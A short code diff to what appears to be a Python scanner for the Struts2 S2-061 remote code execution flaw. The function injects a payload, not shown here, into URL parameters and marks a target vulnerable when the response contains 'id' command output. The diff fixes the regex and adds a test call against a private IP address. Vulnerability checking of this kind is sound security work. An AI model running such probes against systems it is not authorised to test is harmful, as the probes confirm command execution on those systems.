@@ -16,7 +16,7 @@ def s2_061(url):
             payload = "/?{0}=".format(p) + payload
             vurl = urllib.parse.urljoin(url, payload)
             req = requests.get(vurl, timeout=3)
-            if re.search('uid=.+ gid=.+ groups=.+', req.text):
+            if re.search(r'uid=.+ gid=.+ groups=.+', req.text):
                 relsult['vulnerable'] = True
                 relsult['url'] = url
                 relsult['payload'] = vurl
@@ -25,3 +25,5 @@ def s2_061(url):
         return relsult
     except:
         return relsult
+if __name__ == '__main__':
+    print(s2_061('http://192.168.233.132:8080'))
